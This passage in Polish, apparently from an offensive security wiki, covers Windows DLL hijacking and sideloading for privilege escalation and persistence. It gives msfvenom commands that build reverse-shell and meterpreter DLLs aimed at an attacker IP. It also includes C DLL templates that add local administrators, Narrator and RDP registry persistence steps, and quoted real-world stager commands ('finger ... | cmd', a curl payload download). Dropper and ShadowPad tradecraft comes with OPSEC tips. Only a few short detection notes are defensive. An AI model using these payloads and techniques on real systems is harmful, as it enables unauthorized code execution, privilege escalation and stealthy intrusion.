Aby zapoznać się z pełnym przewodnikiem na temat **nadużywania DLL Hijacking do eskalacji uprawnień** przy uprawnieniach do zapisu w **folderze System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze w systemowym PATH.\
Inne przydatne narzędzia automatyczne do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy, które pozwolą skutecznie go wykorzystać, będzie **utworzenie dll eksportującej co najmniej wszystkie funkcje, które plik wykonywalny będzie z niej importował**. Pamiętaj, że DLL Hijacking przydaje się do [eskalacji z poziomu Medium Integrity do High **(z obejściem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia prawidłowej dll** znajdziesz w tym opracowaniu dotyczącym DLL hijacking przy uruchamianiu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą przydać się jako **szablony** lub do utworzenia **dll z eksportowanymi niewymaganymi funkcjami**.

## **Tworzenie i kompilowanie DLL**

### **Proksyfikacja DLL**

Zasadniczo **DLL proxy** to DLL, która potrafi **wykonać twój złośliwy kod po załadowaniu**, a jednocześnie **udostępniać funkcje** i **działać** zgodnie z **oczekiwaniami**, **przekazując wszystkie wywołania do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proksyfikować, a następnie **wygenerować proksyfikowaną dll**, albo **wskazać DLL** i **wygenerować proksyfikowaną dll**.

### **Meterpreter**

**Pobierz rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (dla x86; nie znalazłem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własny

W wielu przypadkach skompilowana DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozpoznać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Dostępność/ATs)

Windows Narrator.exe nadal przy uruchamianiu sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć w celu wykonania dowolnego kodu i zapewnienia trwałości.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Ścieżka sprawdzana w obecnych kompilacjach: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (w starszych kompilacjach): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna biblioteka DLL kontrolowana przez atakującego, zostanie załadowana i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne eksporty.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna biblioteka DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC: działanie bezgłośne
- Naiwny hijack będzie odtwarzać mowę lub podświetlać elementy UI. Aby działać po cichu, podczas dołączania wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i trwałość za pomocą konfiguracji Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po zastosowaniu powyższych ustawień uruchomienie Narratora ładuje podłożoną DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL zostanie wykonana jako SYSTEM na bezpiecznym pulpicie.

Wykonanie jako SYSTEM wyzwalane przez RDP (ruch boczny)
- Włącz klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL zostanie wykonana jako SYSTEM na bezpiecznym pulpicie.
- Wykonywanie zostaje zatrzymane po zamknięciu sesji RDP — niezwłocznie wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru narzędzia Accessibility Tool (AT) (np. CursorIndicator), zmienić go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; nie są potrzebne żadne eksporty.

## Studium przypadku: CVE-2025-1729 - eskalacja uprawnień za pomocą TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia do katalogu**: Zapis jest dozwolony dla `CREATOR OWNER`, co umożliwia lokalnym użytkownikom umieszczanie dowolnych plików.
- **Zachowanie przy wyszukiwaniu DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i zapisuje komunikat "NAME NOT FOUND", jeśli pliku brakuje, co wskazuje na priorytet wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić złośliwy plik pośredniczący `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do wykonania kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w chwili uruchomienia zadania administrator jest zalogowany, złośliwy DLL zostanie uruchomiony w sesji administratora z poziomem integralności medium.
4. Połącz standardowe techniki obejścia UAC, aby przejść z poziomu integralności medium do uprawnień SYSTEM.

## Studium przypadku: Dropper MSI CustomAction + DLL Side-Loading przez podpisany proces hosta (wsc_proxy.exe)

Aktorzy zagrożeń często łączą droppery oparte na MSI z DLL side-loading, aby uruchamiać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje prawidłowy, podpisany plik EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego pliku EXE kolejność wyszukiwania DLL w Windows powoduje, że wsc.dll z katalogu roboczego jest ładowany jako pierwszy, uruchamiając kod atakującego w podpisanym procesie nadrzędnym (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający w tle osadzony plik.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w CAB pliku MSI:
  - Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Możesz też użyć lessmsi: lessmsi x package.msi C:\out
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction w VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll z katalogu, w którym się znajduje.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymagań dotyczących eksportów użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która również uruchamia payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i przekazywane eksporty mogą wpływać na kolejność wyszukiwania, dlatego należy je uwzględnić przy wyborze pliku binarnego hosta i zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad przy użyciu **triady trzech plików**, aby wtapiać się w legalne oprogramowanie, a jednocześnie przechowywać główny payload na dysku w postaci zaszyfrowanej:<sup>[[12]](#references)</sup>

1. **Podpisany plik EXE hosta** – nadużywa się plików dostawców takich jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby przypominał plik binarny Windows (na przykład `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Złośliwa loader DLL** – umieszczana obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zwykle plik binarny MFC zaciemniony za pomocą frameworka ScatterBrain; jej jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i refleksyjne zmapowanie ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, aby zatrzeć ślady kryminalistyczne.

Uwagi dotyczące tradecraftu:

* Zmiana nazwy podpisanego pliku EXE (przy zachowaniu oryginalnej wartości `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod plik binarny Windows, a jednocześnie zachować podpis dostawcy. Możesz więc naśladować praktykę Ink Dragon polegającą na umieszczaniu plików przypominających `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, większość mechanizmów allowlistingu wymaga jedynie umieszczenia złośliwej DLL obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny zazwyczaj może działać bez zmian.
* Deszyfrator ShadowPad wymaga, aby blob TMP znajdował się obok loadera i był zapisywalny, żeby mógł wyzerować plik po mapowaniu. Katalog musi pozostać zapisywalny do czasu załadowania payloadu; gdy payload znajdzie się już w pamięci, plik TMP można bezpiecznie usunąć ze względów OPSEC.

### Łańcuch LOLBAS stager + sideloading archiwum etapowego (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, tak aby jedynym niestandardowym artefaktem na dysku była złośliwa DLL umieszczona obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Loader poleceń zdalnych (Finger):** ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operatorom rotowanie drugiego etapu po stronie serwera.

- **Wbudowane pobieranie i rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść cel sideloadingu oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows narzędzia tar.

- **Uruchomienie przez WMI/CIM:** Uruchom plik EXE przez WMI, aby telemetria pokazywała proces utworzony przez CIM podczas ładowania znajdującej się obok biblioteki DLL:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z plikami binarnymi, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Wykrywanie:** Generuj alerty dla `forfiles`, gdy jednocześnie występują `/p`, `/m` i `/c`; takie połączenie jest rzadko spotykane poza skryptami administratorów.


## Studium przypadku: dropper NSIS + sideload Bitdefender Submission Wizard (Chrysalis)

Niedawny atak Lotus Blossom nadużył zaufanego łańcucha aktualizacji, aby dostarczyć dropper spakowany w NSIS, który przygotował sideload DLL oraz payloady uruchamiane w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim przemianowany plik Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Plik hosta EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` wczytuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą strumienia opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor plaintextem shellcode'u, zwalnia tymczasowe dane i wykonuje skok do niego.
- Aby uniknąć IAT, loader rozwiązuje adresy API przez hashowanie nazw eksportów przy użyciu **bazy FNV-1a 0x811C9DC5 + liczby pierwszej 0x1000193**, a następnie stosuje funkcję avalanche w stylu Murmur (**0x85EBCA6B**) i porównuje wyniki z hasłami docelowymi z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł przypominający PE, wykonując w pięciu przebiegach sekwencję add/XOR/sub z kluczem `gQ2JR&9;`, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza w czasie działania ciągi nazw DLL za pomocą transformacji bitowego obrotu/XOR dla każdego znaku, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego mechanizmu rozwiązywania adresów, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tablicę eksportów w blokach 4-bajtowych z mieszaniem w stylu Murmur i korzysta z `GetProcAddress` tylko wtedy, gdy nie znajdzie hasha.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w upuszczonym pliku `BluetoothService` pod **offsetem 0x30808** (rozmiar **0x980**) i jest odszyfrowywana za pomocą RC4 z kluczem `qwhvb^435h&*7`, co ujawnia URL C2 i User-Agent.
- Beacony tworzą rozdzielany kropkami profil hosta, poprzedzają go tagiem `4Q`, a następnie szyfrują RC4 z kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i obsługiwane przez przełącznik tagów (`4T` shell, `4V` wykonanie procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` odinstalowanie, `4` wyliczanie dysków/plików + przypadki transferu dzielonego na fragmenty).
- Tryb wykonania zależy od argumentów CLI: brak argumentów = instalacja mechanizmu persistence (usługa/klucz Run) wskazującego na `-i`; `-i` ponownie uruchamia plik z argumentem `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- Ten sam atak umieścił Tiny C Compiler i uruchomił `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, a obok niego znajdował się `libtcc.dll`. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który był kompilowany i uruchamiany w pamięci, bez zapisywania pliku PE na dysku. Można to odtworzyć za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten etap kompilacji i uruchomienia oparty na TCC importował `Wininet.dll` w czasie wykonywania i pobierał drugi etap shellcode’u z zakodowanego na stałe adresu URL, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Sideloading zaufanego hosta z proxyowaniem exportów i uśpieniem wątku hosta

Niektóre łańcuchy DLL sideloadingu dodają **mechanizmy zapewniające stabilność**, dzięki którym legalny host pozostaje aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Zaobserwowany schemat
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa biblioteka DLL **proxyuje każdy oczekiwany export** do prawdziwej biblioteki DLL systemu (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal się powiedzie, a proces hosta będzie działać.
- Po załadowaniu złośliwa biblioteka DLL **modyfikuje punkt wejścia hosta**, aby główny wątek trafił do nieskończonej pętli `Sleep`, zamiast zakończyć działanie lub wykonać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ważne
- Standardowe proxyowanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla kolejnych etapów.
- Uśpienie głównego wątku przez `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu, podczas gdy loader wykonuje deszyfrowanie, przygotowuje kolejne etapy lub inicjuje połączenie sieciowe w wątku roboczym.
- Poszukiwanie wyłącznie podejrzanego `DllMain` może nie wykryć tego schematu, jeśli istotne działania następują po zmodyfikowaniu punktu wejścia hosta i uruchomieniu wątku pomocniczego.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, jaką bibliotekę DLL ładuje z lokalnego katalogu.
2. Utwórz proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. W tym wątku zmodyfikuj punkt wejścia hosta lub procedurę startową głównego wątku tak, by zapętlał się na `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` albo ręcznie zamapuj payload.

Wskazówki dla obrony
- Podpisane procesy ładujące `version.dll` lub podobne popularne biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w punkcie wejścia procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej biblioteki DLL o odszyfrowanej nazwie.
- Proxy DLL eksportujące wszystkie funkcje, umieszczone obok plików wykonywalnych dostawcy w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Analizy wywiadowcze: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – eskalacja uprawnień za pomocą TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – aplikacja UWP TPQM Assistant](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe złośliwe oprogramowanie wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL hijacking spotyka windowsowe narzędzia pomocnicze](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórzy: anatomia ewoluujących kampanii podszywania się rozpowszechniających Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżność interesów: analiza klastrów zagrożeń wymierzonych w rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i mechanizmów działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: dogłębna analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: łańcuch ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich z 2026 r. prowadzonych przez irańską grupę APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu z Iranem](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 wymierza działania w rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – format PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – analiza wariantu SectopRAT osadzonego w legalnym oprogramowaniu](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
